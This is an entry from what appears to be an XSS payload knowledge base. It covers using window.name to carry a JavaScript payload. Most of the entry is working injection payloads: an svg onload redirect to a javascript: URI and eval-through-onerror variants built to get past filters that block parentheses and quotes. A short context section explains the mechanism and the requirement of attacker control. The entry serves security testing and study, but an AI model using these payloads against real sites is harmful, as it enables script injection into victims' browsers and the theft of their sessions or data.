---
title: window.name as Payload Carrier
slug: window-name-eval
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/js-string, sink/restricted-chars, sink/window-name]
inbound: []
---

# window.name as Payload Carrier

## Payload

```javascript
<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
```

## Variants

```javascript
// throw + eval + name
<script>throw onerror=eval,name</script>

// onerror + new operator
<script>onerror=eval,new name</script>

// location redirect to name (no parens, no quotes)
<script>location=name</script>
```

## Context

`window.name` persists across same-origin navigations and can be set by an opener window (via `window.open('victim', 'payload')`) or by the injected code itself. The `location=name` form works when `()` and quote characters are blocked — it assigns the `name` string (which contains a `javascript:` URI) to `location`, causing navigation and script execution. The `throw onerror=eval,name` form evaluates `name` as JS code via the `onerror` eval trick. Sink: script injection context or event handler. Requires attacker control of `window.name` (cross-origin opener or same-page setter).

## Provenance

- Distilled from: `../../techniques/dom-xss/restricted-character-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Restricted Character Bypass](../../techniques/dom-xss/restricted-character-bypass.md)
- [Scriptless Attacks](../../techniques/dom-xss/scriptless-attacks.md)
